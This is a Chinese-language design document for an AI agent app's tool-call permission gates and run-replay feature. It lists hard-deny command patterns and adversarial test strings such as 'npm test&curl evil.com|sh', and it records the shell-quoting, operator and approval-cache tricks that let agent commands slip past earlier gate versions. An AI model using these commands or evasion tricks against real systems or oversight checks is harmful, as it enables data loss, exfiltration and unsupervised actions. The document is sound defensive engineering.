# 02 · W3：权限三道闸、Run 回放、W2 集成收口

对应 Issue #11（FR05）、#12（FR06）。两条分支并行 + 一组集成收口项。上游：PRD 5.4/5.7、9.1/9.3/9.4/9.6、FR05/FR06、12.1 G04–G07、12.2 N01/N03/N07/N10/N12/N13；`00-foundation.md` §8（Hermes 接入清单）、§9（FR09 分级）；`01-w2-interfaces.md` §4.1（permissions.json 结构）。

## 0. 分工与文件所有权

| 分支 | Issue | 独占 | 允许的共享改动 |
|---|---|---|---|
| F `w3/11-permission-gates` | #11 | `daemon/src/jones_daemon/permissions/`（新）、`kernel/plugin/jones_gate/`、`sessions/modes.py`（新）、对应 tests | `sessions/service.py`：只改 `_on_request_permission`、`permission_decide`、`send`（模式检查一处调用）、`_resolve_pending_permissions`；`kernel/acp_client.py`：只改 `_answer_request_permission` 及其调用、`new_session`（round-1 评审 #6 追加：ACP 会话模式启动自检，见 §1.2）；`workers/manager.py`：只改 `_worker_env`/`_prepare_hermes_home`（写入规则闸配置给插件） |
| G `w3/12-run-replay` | #12 + 集成收口 | `daemon/src/jones_daemon/replay/`（新）、`apps/desktop/src/renderer/**` 中的回放 UI、`daemon/tests/test_replay*.py` | `sessions/service.py`：只改 `_handle_tool_call_start/_update`、`_finalize_*`、`_terminate_run`、`run_get/run_steps`、`_cwd_for_project`；`rpc/methods.py`：`daemon.status` 真实计数；`apps/desktop/src/main/index.ts`：`ALLOWED_RPC_METHODS` 扩到 RPC v0 全部方法；新增 `pnpm e2e` |

两条分支都会碰 `sessions/service.py`，**按上表函数级划分**；不要在对方的函数里改一行。`__main__.py` 仍是加一行原则。

## 1. F：权限三道闸（FR05）

### 1.1 裁决模型

```
worker(Hermes) ── pre_tool_call(jones_gate 插件) ──┐
   ① 规则闸（插件内，本地同步，零 IPC）：           │
      - 硬禁止清单命中 → block（不可逆删除永不执行，PRD 5.7；任何配置不可放宽）
      - permissions.json deny 命中 → block
      - permissions.json allow 命中 且 会话模式允许 → 直接放行（返回 None/allow）
      - chat 模式 → block 一切工具（N12）
   ② 其余 → 返回 approve → Hermes request_tool_approval() → ACP session/request_permission → daemon
daemon ── _on_request_permission ──┐
   ③ 审查闸（daemon 内）：对动作做风险分级 →                    │
      - 低风险 且（auto 或 task 模式） → 自动 allow（记录 decided_by=rule）——round-1 评审
        #4（2026-09-19）修正：原文「低风险 且 auto 模式」/「高风险 或 task 模式」是 PRD 9.1
        的简写，字面读起来会让 task 模式下的只读工具也逐条弹用户闸，与 PRD 9.1 原文「task 模式：
        允许；只读工具直接放行，改变外部世界的动作逐条走三道闸」相悖；chat 模式在规则闸①就被
        block 一切工具（N12），根本不会走到这一步，所以这里不必再提 chat
      - 非低风险（medium/high） → 用户闸：写 permission_decisions(pending)，推 permission.requested，等待 permission.decide / 超时(只能 deny)
```

- **规则闸配置下发**：`_prepare_hermes_home` 把该会话生效的规则（`ctx.config.permissions(project_id)` 合并结果 + 会话模式 + Agent 工具白名单）写成 `<HERMES_HOME>/jones_gate.json`；模式切换 / 规则变更时 daemon 重写该文件并（若 worker 活着）通过 ACP 发一个自定义 `session/update`？——**不要**：ACP 没有这种反向配置通道。裁定：插件每次 `pre_tool_call` 读一次 `jones_gate.json`（几 KB，mtime 缓存），零协议扩展；模式切换即时生效（PRD 9.1）。
- **硬禁止清单**（代码常量，不可配置放宽）：任何 `rm` 搭配 `-r`/`-R`/`-rf`/`-fr`/`--recursive`（**Round 4 起不再有临时目录例外** —— 见 §1.3 R2；`rm -rf /tmp/x` 与指向任意其它目录一样硬拒）、`trash`/清空回收站、`git push --force` 到默认分支、`shred`、`mkfs*`、`diskutil erase*`、以及对 `~/.jones/`、`<project>/.jones/permissions.json` 的写删（Round 4 起要求同一流/同一原文里出现写删动词，纯读不再被这一层硬拒——见 §1.3）。**判定方式**（Round 4/Round 5 两层过近似，见 §1.3/§1.4，不使用 `shlex`）：一个引号感知的扁平 token 流扫描器 + 一个"去掉引号字符后的原文"正则扫描，命中任一层即拒；不试图理解命令边界或验证目标路径，宁可误拒（PRD 5.7）。
- **审查闸的风险分级**：v1 用**确定性规则**（工具名 + 参数特征：写文件在工作区内/外、终端命令是否含网络外发 `curl|wget|ssh|scp`、浏览器工具按 §9 分级表），不接第二个 LLM 客户端。`review/` 子模块暴露 `classify(tool, args, ctx) -> Risk(low|medium|high, reasons)`；后续要换成模型判断时只换这个函数。**理由写进文档**：PRD 说审查闸是「模型对高危动作二次判断」，v1 用规则先满足 G04/G05/G06 的可测性，模型判断作为 W4+ 增强并在 PRD 中标注。
- **模式**（`sessions/modes.py`）：`chat` 插件 block 一切工具；`task` 写动作逐条用户闸；`auto` 规则闸 allow 范围内直接执行、审查闸 high 才用户闸。子会话模式不得比父宽（N13：`create(parent_id, mode)` 校验；工具白名单用 `agents/policy.is_tool_allowlist_subset`）。
- **审批超时**：`settings.approval_timeout_minutes`，到期自动 deny 并按 9.3 错误终止（卡片注明「审批超时」）；无「超时自动批准」。
- **remember**：`permission.decide.remember = session|project` → 写入会话级内存规则 / 项目级 `permissions.json`（只能是 allow 收窄到具体 match，不得触碰硬禁止）。**Round 4（控制者裁定 R1，2026-09-19）**：`match` 对 `terminal` 工具不再有前缀/子串语义——规范化（去首尾空白、连续空白折成一个空格，不做任何 shell 解析）后必须与被检查的整条命令文本逐字相等才算命中；`remember` 写出的 `match` 本身就是用户当时批准的那条完整命令文本，天然满足这个约束。非 `terminal` 工具的规则仍是工具名精确相等（未变）。见 §1.2 与 `kernel/plugin/jones_gate/_rules.py` 模块文档。
- **写库时序**（见 spike 01 §审计写入时序）：`permission_decisions` 在 request 到达 daemon 时写 pending 行；裁决后 UPDATE；step 与 decision 通过 ACP tool_call_id 关联，取不到时用合成 id 并标注。
- **编辑审批接入点**：`acp_adapter/edit_approval.py`（write_file/patch）也会发 `request_permission`——同一条 daemon 路径处理，参数形状不同要识别。
- **验收对应**：写 `daemon/tests/test_gates_*.py` 覆盖 G04（三闸各一）、G05（三模式下 rm -rf 全拒）、G06（三模式行为）、N01/N03/N12/N13；用假 ACP agent 驱动。

### 1.2 落地时的契约细化（2026-09-19，实现阶段发现，非设计推测）

- **`jones_gate.json` schema**（daemon 写、插件读，读写两侧各自实现见
  `permissions/gate_config.py`/`kernel/plugin/jones_gate/_config.py`，互不 import）：
  ```jsonc
  {
    "mode": "chat" | "task" | "auto",
    "user_root": "<abs path>",              // 硬禁止清单的保护根
    "project_permissions_path": "<abs path>" | null,
    "cwd": "<abs path>" | null,              // 审查闸 write_file/patch 判定工作区内外用
    "rules": [{"match": str, "action": "allow" | "deny"}],
    "rules_degraded": bool,                  // permissions.json 局部不可读时 true；此时
                                              // 插件不信任任何 allow 命中，一律升级（见下）
    "tool_allowlist": [str, ...]              // 空=不限；父会话链非空白名单在写入前已交集narrow（N13）
  }
  ```
  写入时机：仅 `sessions/service.py::send()` 的立即执行分支（一次调用，契约原文"模式检查一处调用"）；
  排队后由 `_advance_queue`（G/#12 所有）出队执行的 Turn **不**触发刷新——已知缺口，写进了报告，
  不在本分支touch scope 内解决。
- **规则闸的 `rules_degraded` 处理**（评审发现，不是设计推测）：`config/resolver.py::Permissions.
  degraded=True` 时说明 permissions.json 某一层解析失败，合并出的 `rules` 可能"丢了一条本该存在的
  deny"——插件据此把这一状态下的 `allow` 命中当作"没有规则闸意见"处理（升级到②，绝不直接放行），
  `deny` 命中仍然生效（宁可多问，不可漏挡）。
- **`write_file`/`patch` 不走 `pre_tool_call` 的 approve 分支**（本节解决 00-foundation.md §7 留下的
  "两套审批逻辑打架"未决问题）：源码核对（`acp_adapter/edit_approval.py` + `model_tools.py` 的
  `_run_pre_dispatch_checks`）发现 `acp_adapter/server.py::_wire_turn_callbacks` 无条件绑定了第二条
  独立的 ACP `session/request_permission` 通道专管这两个工具（`edit_approval.py`），且这条通道**先验证
  真实结构化参数** `{"tool", "arguments"}`，晚于 `pre_tool_call` 但先于工具真正执行。若 Jones 的插件
  也对这两个工具返回 `approve`，用户会被问两遍。裁定：`_on_pre_tool_call` 对 `write_file`/`patch` 只输出
  `block`（硬禁止/规则闸拒绝/chat 模式）或 `None`（放行到下一关——包括"没有规则闸意见，交给
  edit_approval.py"这一种情况），**永不**对这两个工具返回 `approve`。代价（写进报告"没做什么"）：
  `edit_approval.py` 自己的 auto-approve 策略（`should_auto_approve_edit`）不是 Jones 控制的，auto
  模式+低风险的 write 仍可能在真实 Hermes 里弹一次 Hermes 自己的确认框（daemon 侧仍会瞬间自动应答，
  用户唯一能看到的只是这一次真实 Hermes 的对话框，不是两次）。
- **daemon 侧如何拿到真实 tool 名/参数**（spike「审计写入时序」留的开放问题的落地）：源码核对
  `tools/approval.py::request_tool_approval()` 证实——`pre_tool_call` 的 `approve` 分支转发给它时，
  daemon 收到的 ACP `toolCall.rawInput` 只有 `{"command": "<tool_name> (plugin approval rule)",
  "description": <插件 message>}`，**没有真实参数**（`_build_permission_tool_call` 的固定行为）。
  Jones 的插件因此把审查闸需要的数据（工具名+参数，截断到 4000 字符）编码进它自己的 `message`
  （`kernel/plugin/jones_gate/_review_payload.py`），daemon 侧 `sessions/service.py::_extract_tool_call`
  解码回来。`write_file`/`patch` 因为走 `edit_approval.py` 通道（`rawInput={"tool","arguments"}`），
  天然带真参数，不需要这层编码。两种形状 daemon 都要认，`_extract_tool_call` 的 docstring 是准确来源。
- **`rule_key` 必须每次唯一**（安全修复，非原计划）：`tools/approval.py` 的 `pattern_key=
  f"plugin_rule:{rule_key}"` 是 Hermes 自己的会话/永久 allowlist 缓存键；W2 骨架把 `rule_key` 设成裸
  `tool_name`，意味着对某个工具"允许本次会话"一次，会让**同一会话内任何参数的后续调用**都被 Hermes
  自己的缓存直接放行，绕过 Jones 完全不知情——这与 Jones 自己的 `remember` 语义（收窄到具体 match）
  冲突且更宽松，是安全问题不是特性。修法：`rule_key` 改成 `f"{tool_name}:{tool_call_id or uuid4().hex}"`
  ——保证 Hermes 自己的缓存对 Jones 转发的调用永远不命中；`remember` 完全由 Jones 自己的规则闸
  （`jones_gate.json` 的 `rules`/`tool_allowlist`）实现，两套记忆机制不再可能打架。
- **`decided_by` 新增第四个值 `"timeout"`**（00-foundation.md §5 `permission_decisions.decided_by
  (rule/model/user)` 的列描述在此追加，未改已有文字）：审批超时自动拒绝时如实记 `decided_by="timeout"`，
  不借用 `"rule"`（规则闸没有参与这次拒绝）或 `"user"`（没有真人）。该列本身是无约束 TEXT，非枚举，不需要
  迁移。
- **审计写入②（规则闸本地拒绝）的落库不在本分支范围**：spike「审计写入时序」②描述的
  `insert_permission_decisions(gate="rule", ...)` 写入点在 `_handle_tool_call_update`（G/#12 独占函数，
  见 §0 分工表），本分支只保证消息格式稳定：`RULE_GATE_BLOCK_PREFIX = "JONES RULE GATE: "`
  （`kernel/plugin/jones_gate/__init__.py`），沿用 `docs/spikes/hermes_hook_demo.py` 已有约定，供 G 解析。
- **已发现但不在本分支范围内修复的 bug（写实测复现，供 G/#12 或后续排查）**：在 `main`（未动过我的任何
  代码）上可稳定复现——同一 Session 内，一次真实的 ACP `session/request_permission` 往返（无论走
  `NEEDS_PERMISSION` 还是本分支新加的 `CUSTOM_PERMISSION_JSON`）完成后，**第二次** `session.send()`
  能正常跑完并广播完成事件，但随后的进程/事件循环收尾（`asyncio.run()` 的 `_cancel_all_tasks`）会
  挂起、不再返回——用 `daemon/tests/fake_acp_agent.py` + 一个不依赖任何本分支代码的最小复现脚本已验证。
  报告里给了完整复现步骤；这是 `kernel/acp_client.py`/`workers/manager.py`（A/#10 所有）范围内的问题，
  本分支的测试套件已经改写成不触发它（见 `test_gates_sessions_integration.py` 里
  `test_remember_session_persists_an_allow_rule_for_this_session_only` 的说明），CI 因此仍是绿的，
  但这个 bug 本身没有被这条分支修掉。
- **ACP 会话模式启动自检**（round-1 评审 #6，2026-09-19；扩大了 §0 对 `kernel/acp_client.py` 的允许
  改动范围，加入 `new_session`，DEV.md「改接口先改文档」）：核对已安装 `hermes-agent` 源码
  （`acp_adapter/server.py::_MODES`/`_edit_approval_policy_for_state`）发现，ACP 会话模式一旦不是
  `"default"`（`accept_edits`/`dont_ask`），`edit_approval.py::should_auto_approve_edit` 会在工作区内
  （或全部非敏感）路径下直接放行 `write_file`/`patch`，**根本不发** `session/request_permission`——
  本插件对这两个工具只返回 `block`/`None`（见 `__init__.py` 的 "write_file/patch special case"），
  daemon 侧因此永远收不到请求，本 PR 的用户闸/审查闸对这两个工具会静默失效，且没有任何探针能发现
  （现有探针只证明插件加载了，证明不了 edit 通道的策略）。
  今天这是**潜在**而非已触发的风险：Jones 代码库里没有任何地方调用 `session/set_mode`，ACP 会话
  模式因此只会停留在 Hermes 自己的默认值 `"default"`；但没有任何东西"钉死"它，也没有任何自检验证过
  这一点——00-foundation.md §8.1 对同类"第五条绕过路径"的处理标准是"显式关掉 + 启动自检证明"。
  `new_session()` 因此在收到 `session/new` 响应后做一次只读自检：若响应携带 `modes.currentModeId`
  且它不是 `"default"`，拒绝使用这个 worker（`AcpProtocolError`，被 `workers/manager.py::
  _spawn_and_check` 的既有 `except` 分支转成 `WorkerStartupError`，即 09-19 前就有的 fail-closed 路径，
  不是新错误类型）。`modes` 字段缺失（测试用的 `fake_acp_agent.py`、或一个不支持 ACP 模式的旧版
  Hermes）不视为违规，只有显式的非 `"default"` 值才算——不新增 `session/set_mode` 调用去"钉死"它
  （那需要的 RPC 往返/新状态超出了这条分支已经很大的改动面，且今天没有任何代码路径会把模式改成别的
  值，钉死一个不会被改的东西不是这条修复要解决的问题）；如果未来确有代码开始调用 `session/set_mode`，
  这个自检会在那一刻立即变成真正的拒绝，而不是继续静默通过。

### 1.3 Round 4：终端命令匹配前提重写（控制者裁定 R1/R2，2026-09-19，不可推翻）

第 1–3 轮评审各自在一个「按 shell 操作符切分 segment、逐个 argv 判定」的裁决引擎上补了一个洞
（`&&`/`;`/`|` → 通配 wrapper（`sh -c`/`env`/`xargs`）→ `$(...)`/重定向 → `&`/换行），DEV.md
工程原则 #2 明确禁止的「patch 打 patch」。控制者裁定改前提，不再补第 5 个洞：

- **允许快路径不再有前缀/子串语义**（R1）：`permissions.json` 里 `terminal` 工具的规则（含
  `remember` 写出的）统一为「规范化后整串相等」匹配——规范化只做「去首尾空白、连续空白折成一个
  空格」，不调用任何 shell 分词器。任何操作符拼接（`&`/`;`/`\n`/`$(...)`/重定向……）产生的命令
  文本都不可能再与一条规则的 `match` 逐字相等，因此不需要枚举操作符列表去防它们——这正是「前缀
  匹配」与「整串相等」的本质区别：前者需要一份完整的操作符黑名单才安全，后者不需要任何黑名单。
  非 `terminal` 工具的规则不受影响（工具名精确相等，从未涉及命令文本）。`_is_command_prefix`
  （及第 1–3 轮围绕它写的全部 segment/substitution 匹配辅助函数）已删除，
  `kernel/plugin/jones_gate/_rules.py` 现在是这个模块唯一的匹配实现。
- **`compound` 命令永不走规则闸放行**（R2）：命令文本中出现 `;`/`&`/`|`/`` ` ``/`$(`/换行中的任意
  一个即标记为 `compound`（纯文本子串扫描，不解析 shell），`decide()` 对 compound 命令永远不返回
  `"allow"`——即使某条规则的 `match` 恰好逐字等于这个 compound 字符串本身（含 blanket
  `{"match":"terminal","action":"allow"}` 这种「信任整个工具」的宽边界，第 2 轮曾把它排除在修复
  范围外，本轮裁定不再豁免：一律 escalate 到 daemon 审查闸）。审查闸对 `terminal` 调用的基线本来
  就是 `medium`（从不返回 `low`，见 `permissions/review.py::_classify_terminal`），因此
  "compound 给 medium 起步" 无需新增分支即已满足；`_NETWORK_EGRESS_PROGRAMS` 补充了 `nc`（原来只有
  `curl`/`wget`/`ssh`/`scp`），使其命中时仍是 `high`。
- **硬禁止分类器改为 token 流上的过近似扫描**（R2）：`_hard_deny.py` 不再尝试理解「这个 token 属于
  哪条子命令」——新的 `tokenize()` 是一个引号感知的单遍扫描器，在空白和任一操作符字符
  `; & | < > ( ) \` \n`（连同换行）处切开（操作符本身丢弃，不作为 token 返回），引号内内容整体保留
  为一个 token，反斜杠转义按 POSIX 处理；硬禁止判定直接在这个扁平 token 流上找模式（`rm` 后面任意
  位置出现递归/强制标志、`shred`/`mkfs*`/`diskutil erase*`/trash、`git push --force` 到默认分支、
  `find ... -delete`），不再需要为 `env`/`nohup`/`timeout`/`xargs`/`find -exec` 这些 wrapper 各写
  一段「剥离自己参数取剩余 argv」的代码——它们的真实 argv 本来就直接躺在扁平 token 流里。唯一仍需
  要递归的是 shell 解释器的 `-c`/`-lc`/`-xc`/… 载荷（它作为一个带引号的 token 整体保留，内部的
  `rm`/`-rf` 要重新 tokenize 一次才能看见），深度上限 3。
  - **代价，明确写下**（PRD 5.7 允许「宁可误拒」）：不再对 `rm -rf` 的目标做 `cwd` 路径解析——第
    1–3 轮的临时目录例外（`rm -rf /tmp/x` 不算硬禁止）被删除，任何 `rm` 搭配递归/强制标志一律硬拒，
    不再尝试证明目标「碰巧」在临时目录下。
  - `~/.jones`/`<project>/.jones/permissions.json` 的硬禁止收窄为「该路径的 token 且同一 token 流
    出现写/删动词（`rm`/`mv`/`cp`/`chmod`/… 等固定清单）才拒」——纯读（如 `cat ~/.jones/x`）不再被
    这一层硬拒；它没有被静默放行：读命令若不含任何操作符就不是 compound，若也没有匹配的
    `permissions.json` allow 规则，仍然 escalate 到审查闸而非零 IPC 执行。
- **契约影响**：`kernel/plugin/jones_gate/_hard_deny.py::classify_command` 的签名从
  `classify_command(command, *, cwd=None)` 改成 `classify_command(command, *, user_root=None,
  project_permissions_path=None)`（不再需要 `cwd` 做路径解析）；独立的 `command_touches_protected_
  path` 函数已删除，功能并入 `classify_command`——`__init__.py::_hard_deny_verdict` 现在只调用一次。
  `is_protected_path`（`write_file`/`patch` 的纯路径参数检查，不涉及 shell）未变。

### 1.4 Round 5（控制者裁定 R5–R9，2026-09-19，最后一轮，不可推翻）

Round 4 的复审又找到三类漏挡（双引号内 `$(...)`、`$'rm'` ANSI-C 引用前缀、重定向写保护
路径），根因诊断：前四轮的裁决引擎（无论是 segment-based 还是 round 4 的扁平 token 流）
都在试图**理解 shell**——先证明一个命令"安全"再放行；一个不完整的 shell 理解器永远有洞，
第 4 轮找到第 3 个洞正是这个前提本身在失败，不是实现不够仔细。本轮改前提，不再打第 5 个
补丁。

**R5：「不可静态分析 → 用户闸」不变量**（新增 `kernel/plugin/jones_gate/_transparency.py`，
stdlib-only、无 `jones_daemon` 依赖，daemon 侧 `permissions/review.py` 直接 import 同一份，
R7）。规则闸对每个终端命令先做一次透明度判定 `transparency(command) ∈ {plain, opaque}`；
命令原文中出现以下任一即 `opaque`：任何引号内含 `$` 或反引号、`$'`/`$"` 前缀、`$(`、反引号、
任何重定向（`<`/`>`——涵盖 `>>`/`2>`/`&>`，同一字符已包含）、`;`/`&`/`|`、字面换行、`$IFS`、
以及解释器/间接执行程序名 token（`sh bash zsh dash ksh fish env nohup timeout xargs eval exec
source . python* node perl ruby php osascript base64 find(含 -delete/-exec) awk sed(含 -i)
tee`；`.`（source 简写）只在**首 token** 位置检查，因为它同时是极常见的"当前目录"路径参数
（`find .`、`grep -r foo .`），basename 归一化又分不出两者——见 `_transparency.py` 的
`_has_leading_dot_source` 文档）。`opaque` 命令：
  - **规则闸**：永不走 `permissions.json` allow 快路径（即使命中裸 `{"match":"terminal",
    "action":"allow"}` 这个"信任整个工具"的宽边界——本轮不再有例外，呼应 Round 4 的
    "compound 命令永不走规则闸放行"，`opaque` 是 `compound` 的严格超集）；
  - **审查闸**：永不被判 `low`/`medium`，直接 `high` → 用户闸（`permissions/review.py::
    _classify_terminal` 现在第一步就做这个判定，早于网络外发程序名检查）；
  - **用户闸卡片**：`sessions/service.py::_on_request_permission` 的 `permission.requested`
    广播新增 `reasons` 字段（`risk.reasons`），`opaque` 时携带"该命令无法静态分析，请人工确认"；
    `tool_call` 字段（原有，未变）本来就携带真实命令/参数（`_extract_tool_call` 两种可解码
    `rawInput` 形状之一），满足"原样展示命令"。

**R6：硬禁止清单改为「原文正则 + token 流」双扫描的过近似**（`_hard_deny.py::
classify_command`，两层都跑，任一命中即拒）：
  1. 在**去掉引号字符（`'`/`"` 直接删除，不是智能剥离）后的原文字符串**上用正则找：
     `\brm\b` 后面（不要求相邻）跟着任意 `-r`/`-R`/`-rf`/`-fr`/`--recursive`、`\bshred\b`、
     `\bmkfs`、`diskutil\s+erase`、`\btrash\b`、`git\s+push[^\n]*(--force|-f)[^\n]*(main|
     master)`；
  2. 保留 Round 4 的 token 流扫描（未变）；
  3. **保护路径**：原文含 `~/.jones`、`$HOME/.jones`、`/.jones/`（任意 Project 的 `.jones`，
     不要求提前知道具体项目路径）且原文含 `>`/`>>` 或写删动词（同一份 `_WRITE_DELETE_VERBS`
     词表，正则化为一次 `\b(...)\b` 搜索）→ 拒；不要求写删动词是独立 token（`echo evil >
     <project>/.jones/permissions.json` 里 `echo` 本身不是写删动词，危险来自重定向本身）。
  - **已知误拒**（PRD 5.7 明确允许，写下而非留作隐含假设）：`echo "rm -rf /tmp/x"`（只是打印
    这段文字，从不真的执行）会被第 1 层正则误拒——引号被整体剥掉后，正则找到的是字面 "rm -rf"
    文本，分不清它是不是真的会被 shell 执行；这是接受的代价，不是待修的 bug。

**R7：审查闸不再用 `shlex.split`**：`permissions/review.py::_classify_terminal` 改用
`kernel/plugin/jones_gate/_hard_deny.tokenize()`（daemon 进程直接 import 该插件包，和
`_review_payload` 同一先例——只有 worker 侧的物理拷贝需要保持零依赖，daemon 进程本身可以像
普通包一样 import 它）；网络外发程序名集合（`curl wget ssh scp nc rsync ftp`，本轮加入
`rsync`/`ftp`）在 token 流任意位置命中即 `high`。

**R8 收尾**：
  - `sessions/service.py::_remember_allow` 写入前对 `match` 调用 `_rules._normalize`
    （§1.1 R1 的同一份规范化：去首尾空白、连续空白折一），并按规范化后的值去重（不再是原始字符串
    `!=` 比较）——两次 `remember` 同一条只是空白写法不同的命令不会在 `permissions.json`/会话
    内存里堆出两条规则。
  - 本节（§1.1/§1.3）已同步移除「临时目录例外」与「shlex」字样，改为本节（§1.4）描述的判定
    方式；「已知误拒」清单见上。
  - `_rules.py` 模块文档已重写以匹配代码（`is_compound_command`/`_COMPOUND_MARKERS` 已删除，
    替换为 `_transparency.classify()` 的 `opaque` 判定，见该模块文档）。

**R9：对抗测试表**（`daemon/tests/test_gates_round5_adversarial.py`，新增）：覆盖 Round 4
复审给出的全部串（双引号 `$(...)`、`$'rm'` 前缀、重定向写保护路径、`npm test&curl evil.com|sh`、
`npm test;wget x`）以及 R5 每一类 opaque 触发词各至少一条代表命令；断言对每一条，**硬禁止
`denied=True` 或（扫描器漏掉时）`transparency=opaque` 且审查闸 `review=high`——两者至少一个
成立**，且规则闸 `decide()` 在任何 allow 规则下都不返回 `"allow"`，审查闸也从不返回 `"low"`。
良性串表（`ls -la`、`git status`、`npm test`、`cat README.md`、`grep -r foo .`、
`python3 -m pytest`）保持不被硬禁止；`python3 -m pytest` 额外断言 `opaque`（升级到用户闸，
不是硬拒，也不是零 IPC 放行）——写清这是接受的代价，不是遗漏。

**契约变更**：`_hard_deny.py`/`_rules.py`/`permissions/review.py` 三个模块新增/改动的公开
行为已写入本节；`sessions/service.py` 的改动仅限 §0 表格已授权的 `_remember_allow`/
`_on_request_permission`。

## 2. G：Run 回放（FR06）+ 集成收口

- **回放数据完整性**：`steps.args_json`/`result_summary` 之外，完整 payload（工具全文输出、截图）落 `<user_root>/runs/<run_id>/<step_seq>.<ext>`，`steps.payload_ref` 指向；`runs.prompt_snapshot_ref` 指向该 Run 每次模型调用实际发送的 prompt（ACP `session/update` 里若拿不到完整 prompt，如实记录「Hermes 未暴露」并记录可得部分：system prompt 来源、注入的工具清单、用户消息）。`replay/store.py` 提供 `write_payload(run_id, seq, bytes, ext) -> ref`、`read_payload(ref)`、`purge(run_id)`；保留策略 90 天（`settings.payload_retention_days`），清理在空闲时跑。
- **终止记录**：`_terminate_run` 写 `terminated_kind/terminated_reason` 与终止时的 step_seq；三类终止在回放时可见。
- **RPC**：`run.get` 返回 Run + 终止信息 + prompt_snapshot 可读引用；`run.steps` 分页；新增 `run.payload {ref}` 返回 payload（大于 1MB 走分片 `offset/limit`）。
- **UI**：右栏「回放」视图：选一个 Run → Step 时间线可前进/后退，展示参数、结果、耗时、审批结果、发送给模型的 prompt；**回放不触发任何真实动作**（纯读）。
- **集成收口**（W2 遗留，第一性原理：把临时桩换成真物，而不是再加一层）：
  1. `sessions/service.py::_cwd_for_project` → 用 `projects.ProjectService.get(project_id)["path"]`，删掉「非默认项目未实现」的 RpcError。
  2. `rpc/methods.py::daemon_status` → 从 `SessionService`/`WorkerManager` 取真实 `sessions_active/workers`（通过 ctx 注入的引用，不用全局变量）。
  3. `apps/desktop/src/main/index.ts::ALLOWED_RPC_METHODS` → RPC v0 §4.1 全部方法名（从一个共享常量文件导出，测试断言与 00-foundation §4.1 表一致）。
  4. `pnpm e2e`：真实起 daemon（`JONES_HOME` 临时目录）+ 真实 Electron，走 `project.list → session.create → session.send`，没有模型 Key 时断言 UI 出现 provider_error 错误卡片而非白屏（G08 的一条）。CI 里跑（macos runner）。
  5. 目录选择对话框：main 加 `dialog:pickDirectory` IPC（白名单），renderer 的 Project 设置页接上。

### 2.1 落地时的契约变更（2026-09-19，实现阶段发现，非设计推测）

- **新增 `run.list {session_id, limit?} -> Run[]`**：00-foundation.md §4.1 的原表从未给出"如何发现一个历史 Run 的 id"——`run.get`/`run.steps` 都要求调用方已经有 `run_id`，唯一的发现渠道是活会话期间收到的 `turn.started` 通知（转瞬即逝，不适合"选一个 Run 回放"这种事后场景）。回放视图的"选一个 Run"下拉框需要这个方法；`sessions/queries.py::list_runs_for_session`（按 `created_at DESC` 排序）+ `SessionService.run_list` + `sessions/methods.py` 注册，纯新增，不改 `run.get`/`run.steps` 既有行为。
- **`run.payload` 的响应形状**：`{ref, offset, size, data_base64, eof}`——payload 可能是二进制（截图），NDJSON 传输要求文本安全，故 base64；`size` 是文件总大小（不是本次返回的字节数），`eof` 让调用方知道要不要继续用 `offset` 翻页，不用自己拿 `size - offset - len(data)` 算。
- **`runs` 表新增列 `terminated_step_seq INTEGER`**（迁移 `005_replay_terminated_step.sql`）：00-foundation.md §5 原 schema 没有承载"终止时正在跑第几个 Step"的列；`terminated_kind`/`terminated_reason` 只说明"为什么"，不说明"在哪"。可空——迁移前终止的 Run、或从未开始过 Step 就终止的 Run，诚实地留 NULL，不补造一个 0。
- **`workers/manager.py::WorkerManager.worker_count()`**（新增，一行只读方法）：§0 表格把 `workers/manager.py` 的 F 共享改动限定在 `_worker_env`/`_prepare_hermes_home`，没有把这个文件列进 G 的共享改动清单；但 `daemon.status` 真实计数（明确分给 G）离不开一个"当前有多少个 worker"的读法，`WorkerManager._workers` 是私有字典，`SessionService`（G 持有 `self.worker_manager`）没有别的干净途径拿到这个数。加一个只读 accessor 是能做到"不碰 F 的两个函数、只加一行新方法"里最小的选择；未在 §0 表格里预先声明，这里补上。
- **`sessions/service.py` touch 超出 §0 表格字面列出的函数清单**：`_run_turn` 本身没被列进 G 的允许清单（清单只列了 `_handle_tool_call_start/_update`、`_finalize_*`、`_terminate_run`、`run_get/run_steps`、`_cwd_for_project`），但两处新增行为只能长在这里，没有别的合理位置：① `_run_turn` 开头写 prompt snapshot（Run 一开始就要落盘，晚了就不诚实）；② provider 预检查（必须在 `WorkerManager.ensure_started()` 之前，即 §2 集成收口第 4 条 `pnpm e2e` 断言的前提——没有这一步，缺 Key 时只会得到一张和"worker 起不来"完全同形状的报错卡，无法验证是 provider_error）。`__init__`/`startup`/`shutdown` 也加了字段/几行（后台任务集合、保留期清理循环的启停）。均为新增行，未改动 F 拥有的 `_on_request_permission`/`permission_decide`/`send` 内部任何一行。
- **provider 预检查不等于把 `ProviderBinding` 接进 worker**：`_run_turn` 现在会在拉起 worker 前调用 `ctx.providers.resolve(model_pref)`，resolve 失败（`RpcError`/`ProviderNotConfiguredError`，两种实现抛的异常类型不同，均已捕获）→ `run.terminated{kind:"error", reason:"provider_error: ..."}`，**不**尝试把 resolve 成功后的 `ProviderBinding`（env/`hermes_config`）写进 worker 的启动环境或 `HERMES_HOME/config.yaml`——那部分仍是 01-w2-interfaces.md §2.1 记录的既有缺口（`_worker_env`/`_prepare_hermes_home` 是 F 的专属触点），本分支只做了"先问一声该不该起"，没有做"起的时候把答案接上"。
- **`sessions/queries.py`/`sessions/methods.py` 不在 §0 表格任何一边的共享改动清单里**（表格只写了 `sessions/service.py` 的函数级划分），但两条分支都必须触碰它们才能实现各自的 RPC 方法；F 与 G 本轮加的函数完全不重叠（G：`update_step` 加 `payload_ref` 形参、`list_run_steps` 加分页、`mark_run_terminated` 加 `terminated_step_seq`、以及 `set_prompt_snapshot_ref`/`list_runs_with_payload_before`/`clear_run_payload_refs`/`get_agent_model_pref`/`list_runs_for_session` 全部新增；`run.list`/`run.payload` 注册 + `run.steps` 分页参数透传），未见冲突，按 DEV.md「先改文档后落地」的精神补记于此。
- **`settings.payload_retention_days` 未写进 `config/resolver.py::DEFAULT_SETTINGS`**：那份默认值表是 C（#8/#9）的专属文件，本分支未触碰；`replay/retention.py::_retention_days` 直接对 `ctx.config.settings(None).get("payload_retention_days", 90)` 取值——`ConfigResolver.settings()` 本就是对磁盘 JSON 文件的无 schema 合并，用户在 `settings.json` 里手写这个 key 一样生效，只是不会出现在"即使两级都没有 settings.json 也保证存在"的默认值里。建议 C 在后续 PR 里把这个 key 补进 `DEFAULT_SETTINGS`，本分支不越界代为改动。

### 2.2 第 1 轮评审修复带来的契约变更（2026-09-19）

